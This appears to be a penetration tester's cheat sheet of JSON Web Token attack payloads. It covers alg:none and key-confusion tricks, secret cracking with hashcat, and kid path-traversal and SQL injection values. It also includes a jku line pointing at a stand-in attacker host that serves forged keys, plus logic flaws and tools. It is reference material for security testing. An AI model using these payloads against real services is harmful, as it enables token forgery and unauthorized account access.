---
title: "Payloads: JWT"
type: payloads
tags: [payloads, jwt, authentication, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-06-05
---

# Payloads: JWT

Attacks on JSON Web Tokens. See [[jwt-attacks]].

## Recon
```
decode header+payload (base64url). Note alg, kid, jku/x5u, iss, exp.
```

## alg confusion / none
```
alg:none  -> header {"alg":"none"} , empty signature
RS256 -> HS256 confusion: sign with the PUBLIC key as HMAC secret
```

## Weak secret (HS256)
```
hashcat -m 16500 token.txt wordlist        # crack signing secret
then forge: change sub/role/admin -> re-sign with cracked secret
```

## kid / header injection
```
kid path traversal:  "kid":"../../../../dev/null"  -> empty key -> sign with ""
kid SQLi:            "kid":"x' UNION SELECT 'key'-- -"
jku/x5u SSRF:        "jku":"https://attacker/jwks.json"   (host your own key set)
```

## Logic
```
no exp check (replay) · accepts tokens from other tenant · weak/none iss check ·
algorithm downgrade · signature not verified server-side (just decoded)
```

## Tooling
```
jwt_tool <token> -M at        # automated checks
jwt.io to inspect (never paste client tokens off-network)
```
